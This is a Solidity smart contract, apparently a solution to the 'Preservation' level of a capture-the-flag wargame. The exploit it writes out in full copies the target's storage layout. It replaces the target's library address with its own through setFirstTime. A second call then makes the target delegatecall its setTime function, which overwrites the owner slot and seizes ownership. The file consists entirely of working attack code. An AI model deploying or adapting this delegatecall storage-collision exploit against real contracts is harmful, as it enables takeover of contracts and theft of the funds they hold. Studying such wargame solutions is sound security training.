// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256) external;

    function setSecondTime(uint256) external;
}

contract PreservationAttack {
    address pad1;
    address pad2;
    address owner; // storage slot to attack
    IPreservation preservation;

    constructor(address _targetAddress) {
        preservation = IPreservation(_targetAddress);
    }

    function attackPrepare() public {
        // Use this contract address to replace the value of timeZone1Library in the target contract.
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function attack() public {
        // setFirstTime of the target contract will delegatecall setTime() function in this contract.
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        // This operation changes the value of the owner in the target contract.
        owner = address(uint160(_owner));
    }
}
